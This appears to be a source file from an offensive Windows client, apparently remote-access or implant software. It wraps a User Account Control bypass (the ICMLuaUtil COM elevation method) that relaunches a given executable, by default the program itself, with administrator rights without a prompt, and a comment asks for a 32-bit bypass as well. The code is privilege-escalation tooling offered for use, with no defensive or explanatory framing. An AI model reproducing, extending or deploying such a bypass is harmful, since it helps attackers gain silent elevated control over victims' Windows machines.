using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Client.Armitage.UAC
{
    /// <summary>
    /// TODO: Find x32 UAC bypass.
    /// </summary>
    public enum UACMethods
    {
        /// <summary>
        /// Works only on x64
        /// </summary>
        ICMLuaUtil = 0,

    }
    public class UACBypass
    {

        public static bool QuickStart(string execpath, string args, UACMethods method)
        {
            try
            {
                switch (method)
                {
                    case UACMethods.ICMLuaUtil:
                        ucmCMLuaUtilShellExecMethod.BypassUAC(execpath, args);
                        break;
                }
                return true;
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.ToString());
            }
            return false;

        }
        public static bool QuickStart(UACMethods method)
        {
            return QuickStart(Constants.MyPath, Constants.MyProcessID.ToString(), method);
        }
    }
}
